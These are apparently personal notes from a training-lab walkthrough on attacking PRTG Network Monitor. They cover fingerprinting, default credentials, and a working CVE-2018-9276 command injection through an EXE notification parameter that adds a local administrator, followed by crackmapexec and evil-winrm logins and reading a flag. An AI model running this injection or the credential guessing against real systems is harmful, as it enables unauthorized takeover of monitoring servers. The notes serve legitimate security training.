# 14 prtg network

PRTG Network Monitor is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more.

It works with an autodiscovery mode to scan areas of a network and create a device list.

The software runs entirely from an AJAX-based website, but there is a desktop application available for Windows, Linux, and macOS.

It is rare to see PRTG exposed externally,

## Discovery/Footprinting/Enumeration

sudo nmap -sV -p- --open -T4 10.129.201.50

8000/tcp open ssl/http Splunkd httpd 8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) 8089/tcp open ssl/http Splunkd httpd

Here we can see that EyeWitness lists the default credentials : prtgadmin:prtgadmin

http://10.129.201.50:8080/index.htm

curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version

#### [New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors](https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors)

Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!

&#x20;PRTG Network Monitor 17.3.33.2830

Example of vulnerability which can be used : https://nvd.nist.gov/vuln/detail/CVE-2018-9276

If default admin credentials failed, try other ones : prtgadmin:Password123

## Leveraging Known Vulnerabilities

http://10.129.201.50:8080/myaccount.htm?tabid=2

Setup > Account Settings > Notifications > Add new notification

Tick the box next to EXECUTE PROGRAM

Demo exe notification - outfile.ps1 Parameter : test.txt;net user prtgadm1 Pwn3d\_by\_PRTG! /add;net localgroup administrators prtgadm1 /add

Now, we could have scheduled the notification to run (and execute our command) at a later time when setting it up

Test EXE notification is queued up

sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d\_by\_PRTG!

## LAB

10.129.239.161

curl -s http://10.129.239.161:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version

Some functionalities may not work correctly or not at all. Consider upgrading to a modern browser version. We recommend [Chrome](https://www.google.com/chrome/) or [Firefox](http://www.mozilla.org/firefox/).

http://10.129.239.161:8080/myaccount.htm?tabid=2

prtgadmin:Password123

Setup > Account Settings > Notifications > Add new notification

Tick the box next to EXECUTE PROGRAM

Demo exe notification - outfile.ps1 Parameter : test.txt;net user prtgadm1 Pwn3d\_by\_PRTG! /add;net localgroup administrators prtgadm1 /add

Test

Other notification types: EXE notification is queued up

sudo crackmapexec smb 10.129.239.161 -u prtgadm1 -p Pwn3d\_by\_PRTG!

SMB 10.129.239.161 445 APP03 \[\*] Windows 10.0 Build 17763 x64 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False) SMB 10.129.239.161 445 APP03 \[-] APP03\prtgadm1:Pwn3d\_by\_PRTG! STATUS\_LOGON\_FAILURE

evil-winrm -i 10.129.239.161 -u prtgadm1 -p Pwn3d\_by\_PRTG! type c:\Users\Administrator\Desktop\flag.txt WhOs3\_m0nit0ring\_wH0?
